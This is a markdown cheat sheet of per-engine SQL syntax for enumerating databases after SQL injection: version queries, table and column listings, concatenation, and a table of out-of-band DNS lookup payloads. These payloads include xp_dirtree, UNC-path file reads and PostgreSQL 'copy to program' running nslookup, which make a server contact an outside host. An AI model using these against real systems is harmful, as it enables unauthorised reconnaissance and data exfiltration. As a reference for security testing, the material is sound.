# Database Enumeration

## Introduction

Once SQL injection has been identified, the next step is to enumerate the underlying database engine. Unfortunately, each database engine uses its own syntax for metadata, which makes this process highly engine-dependent.

### Database Version

| Database   | Version Info                                                                                    |
| ---------- | ----------------------------------------------------------------------------------------------- |
| Oracle     | <p><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></p> |
| Microsoft  | `SELECT @@version`                                                                              |
| PostgreSQL | `SELECT version()`                                                                              |
| MySQL      | `SELECT @@version`                                                                              |

### Database Contents

Listing tables and the columns they contain:

| Database   | Contents Info                                                                                                                                        |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | <p><code>SELECT * FROM all_tables</code><br><code>SELECT * FROM all_tab_columns WHERE table_name = 'Table Name'</code></p>                           |
| Microsoft  | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></p> |
| PostgreSQL | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></p> |
| MySQL      | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'Table Name'</code></p> |

## String Concatenation

| Database   | Concatenation                        |
| ---------- | ------------------------------------ |
| Oracle     | 'a'\|\|'b'                           |
| Microsoft  | 'a'+'b'                              |
| PostgreSQL | 'a'\|\|'b'                           |
| MySQL      | 'a' 'b' (space) or `CONCAT('a','b')` |

## DNS Lookups

| Database   | Lookup Syntax                                                                                                                       |
| ---------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT UTL_INADDR.get_host_address('domain')` - requires elevated privileges                                                       |
| Microsoft  | `exec master..xp_dirtree '//domain/a'`                                                                                              |
| PostgreSQL | `copy (SELECT '') to program 'nslookup domain`                                                                                      |
| MySQL      | <p>These work only on Windows<br><code>LOAD_FILE('\\\\domain\\a')</code><br><code>SELECT ... INTO OUTFILE '\\\\domain\a'</code></p> |
